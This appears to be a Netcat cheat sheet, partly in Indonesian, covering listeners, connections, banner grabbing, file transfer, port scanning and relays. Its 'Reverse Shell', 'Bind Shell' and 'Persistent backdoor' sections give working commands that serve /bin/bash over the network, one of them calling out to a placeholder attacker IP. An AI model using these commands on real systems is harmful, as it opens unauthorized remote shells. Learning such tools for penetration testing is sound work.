# 🔌 Netcat - The Swiss Army Knife

## 📋 Overview
Netcat (nc) adalah networking utility untuk reading/writing data across network connections menggunakan TCP/UDP.

## 🚀 Basic Usage

### Listening Mode
```bash
# TCP listener
nc -l -p 4444

# UDP listener
nc -u -l -p 4444

# Verbose output
nc -l -v -p 4444
```

### Connecting Mode
```bash
# TCP connection
nc 192.168.1.100 4444

# UDP connection
nc -u 192.168.1.100 4444

# Timeout connection
nc -w 5 192.168.1.100 4444
```

## 🎯 Common Use Cases

### Banner Grabbing
```bash
# HTTP banner
echo "GET / HTTP/1.0\r\n\r\n" | nc target 80

# SSH banner
nc target 22

# FTP banner
nc target 21
```

### File Transfer
```bash
# Receiver side
nc -l -p 4444 > received_file.txt

# Sender side
nc target 4444 < file_to_send.txt
```

### Reverse Shell
```bash
# Listener (attacker)
nc -l -v -p 4444

# Target machine
nc attacker_ip 4444 -e /bin/bash
```

### Bind Shell
```bash
# Target machine (bind shell)
nc -l -p 4444 -e /bin/bash

# Attacker connects
nc target_ip 4444
```

## 🔥 Advanced Techniques

### Port Scanning
```bash
# Single port
nc -zv target 80

# Port range
nc -zv target 20-25

# Multiple ports
nc -zv target 21 22 23 80 443
```

### Chat Server
```bash
# Server
nc -l -p 4444

# Client
nc server_ip 4444
```

### Backdoor
```bash
# Persistent backdoor
while true; do nc -l -p 4444 -e /bin/bash; done
```

### Proxy/Relay
```bash
# Simple proxy
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc target 80 1>backpipe
```

## 🎯 Command Options

| Option | Description |
|--------|-------------|
| `-l` | Listen mode |
| `-p` | Port number |
| `-u` | UDP mode |
| `-v` | Verbose output |
| `-z` | Zero I/O mode (scanning) |
| `-w` | Timeout |
| `-e` | Execute command |
| `-n` | No DNS lookup |
| `-k` | Keep listening |

## 🔧 Different Netcat Variants

### Traditional Netcat
```bash
nc [options] hostname port
```

### Ncat (Nmap project)
```bash
ncat [options] hostname port
```

### GNU Netcat
```bash
netcat [options] hostname port
```

### OpenBSD Netcat
```bash
nc [options] hostname port
```

## ⚠️ Security Considerations

### Encrypted Connections (Ncat)
```bash
# SSL server
ncat -l --ssl 4444

# SSL client
ncat --ssl target 4444
```

### Authentication (Ncat)
```bash
# With authentication
ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 4444
```

## 🎯 One-Liners

### Quick Web Server
```bash
# Serve a file
while true; do echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -l -p 8080; done
```

### Log Network Traffic
```bash
# Log connections
nc -l -p 4444 | tee netcat.log
```

### Test Network Connectivity
```bash
# Test if port is open
nc -zv target 22 && echo "SSH is open" || echo "SSH is closed"
```

## 📚 Pro Tips
1. Always use `-v` for verbose output during testing
2. Use `-z` for port scanning without establishing full connection
3. Combine with other tools using pipes
4. Use timeout (`-w`) to avoid hanging connections
5. Consider using ncat for SSL/encryption features

## 🔗 References
- [Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
- [Ncat Documentation](https://nmap.org/ncat/)
- [Netcat Tutorial](https://www.varonis.com/blog/netcat-commands/)
